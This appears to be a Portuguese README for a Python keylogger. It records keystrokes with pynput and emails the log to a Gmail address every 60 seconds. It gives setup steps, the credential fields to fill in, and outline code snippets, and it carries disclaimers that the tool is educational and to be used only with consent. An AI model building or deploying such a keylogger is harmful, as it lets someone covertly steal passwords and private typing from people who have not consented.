🎯 Keylogger Educacional em Python

⚠️ Uso estritamente educacional — não utilize sem permissão.

<p align="center"> <img src="https://img.shields.io/badge/Python-3.10+-blue?logo=python&logoColor=white" /> <img src="https://img.shields.io/badge/Status-Em%20Desenvolvimento-yellow?style=flat-square" /> <img src="https://img.shields.io/badge/Plataforma-Windows%20%7C%20Linux-lightgrey?style=flat-square" /> </p>
📌 Sobre o Projeto

Este repositório apresenta um keylogger simples e educacional, desenvolvido em Python utilizando a biblioteca pynput.
O objetivo deste projeto é demonstrar conceitos de monitoramento do teclado, envio automatizado de logs via e-mail e princípios de segurança defensiva.

❗ Não use este código para fins ilegais.
Coletar dados sem autorização viola leis e políticas de privacidade.

✨ Funcionalidades

✔ Captura de teclas pressionadas em tempo real
✔ Identificação de teclas especiais (space, enter, backspace)
✔ Armazenamento contínuo em memória
✔ Envio automático do log a cada 60 segundos
✔ Conexão com servidor SMTP (Gmail)
✔ Execução em background com keyboard.Listener

🧰 Tecnologias Utilizadas

✔ Tecnologia	Função
✔ Python 3.x	Linguagem principal
✔ pynput	Captura de teclado
✔ smtplib	Envio dos e-mails
✔ email.mime.text	Formatação da mensagem
✔ threading.Timer	Agendamento periódico


⚙️ Instalação
1️⃣ Clone o repositório
git clone https://github.com/seuusuario/seurepo.git
cd seurepo

2️⃣ Instale a dependência principal
pip install pynput

🔧 Configuração de E-mail

Edite no arquivo keylogger.py:

EMAIL_ORIGEM = "seuemail@gmail.com"
EMAIL_DESTINO = "seuemail@gmail.com"
SENHA_EMAIL = "sua-senha-de-app"


💡 Para contas Google, use senha de app criada em:
Google Conta → Segurança → Senha de Apps

▶️ Executando o Projeto
python keylogger.py


A partir daí:

O listener começa a capturar as teclas.

A cada 60 segundos, o log é enviado por e-mail.

O programa roda até ser interrompido manualmente.

🧠 Funcionamento Interno (Resumido)
📍 Captura de teclas
def on_press(key):
    ...

📍 Envio periódico por e-mail
Timer(60, enviar_email).start()

📍 Listener principal
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()

❗ Aviso Legal

📜 Este projeto é destinado apenas para fins educacionais.
O autor não é responsável por qualquer uso indevido.
Utilize somente em ambiente controlado e com consentimento explícito.

📄 Licença

Este projeto pode ser utilizado sob a licença:

MIT License

⭐ Contribua!

Sinta-se à vontade para:

Abrir issues

Criar pull requests

Sugerir melhorias

Pedir novas funcionalidades
